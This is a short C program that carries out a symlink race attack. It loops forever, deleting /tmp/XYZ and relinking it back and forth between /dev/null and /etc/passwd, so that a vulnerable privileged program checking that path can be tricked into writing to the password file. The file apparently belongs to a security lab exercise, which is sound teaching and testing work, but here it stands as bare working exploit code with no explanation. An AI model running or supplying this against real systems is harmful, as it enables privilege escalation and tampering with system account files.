#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define XYZ "/tmp/XYZ"
#define FNULL "/dev/null"
#define PASSWD  "/etc/passwd"


int main (){
     while(1){

         unlink(XYZ);
         symlink(FNULL, XYZ);
         usleep(1000);


         unlink(XYZ);
         symlink(PASSWD, XYZ);
         usleep(1000);
 
     }
     exit(0);
}
